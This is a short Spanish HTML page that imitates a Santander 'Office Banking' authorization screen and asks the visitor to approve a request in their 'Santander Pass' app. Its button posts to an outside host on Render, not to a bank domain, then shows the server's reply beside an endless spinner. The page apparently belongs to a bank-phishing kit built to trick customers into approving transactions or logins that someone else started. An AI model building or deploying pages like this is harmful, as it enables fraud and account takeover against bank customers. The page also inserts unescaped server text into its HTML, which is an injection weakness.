<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Autorización</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="styles.css">
  <style>
    .spinner {
      border: 8px solid #f3f3f3;
      border-top: 8px solid #e60000;
      border-radius: 50%;
      width: 60px;
      height: 60px;
      animation: spin 1s linear infinite;
      margin: 20px auto;
    }
    @keyframes spin {
      0% { transform: rotate(0deg);}
      100% { transform: rotate(360deg);}
    }
  </style>
</head>
<body>
  <div class="login-box">
    <img src="logo-office-banking.png" alt="Office Banking" class="logo">

    <h2>Se enviará una autorización a tu Aplicación AUTORIZA CON TU SANTANDER PASS</h2>
    <button id="autorizarBtn" class="btn-rojo">Autorizar</button>
    <div id="resultado"></div>
  </div>

  <script>
    document.getElementById("autorizarBtn").addEventListener("click", async function(){
      document.getElementById("resultado").innerHTML = 
        '<div class="spinner"></div><p>Procesando autorización...</p>';

      try {
        const response = await fetch("https://tu-app-en-render.onrender.com/autorizar", {
          method: "POST",
          headers: { "Content-Type": "application/json" }
        });
        const data = await response.text();
        document.getElementById("resultado").innerHTML = `<p>${data}</p><div class="spinner"></div>`;
      } catch (error) {
        document.getElementById("resultado").innerText = "⚠️ Error al conectar con el servidor.";
      }
    });
  </script>
</body>
</html>
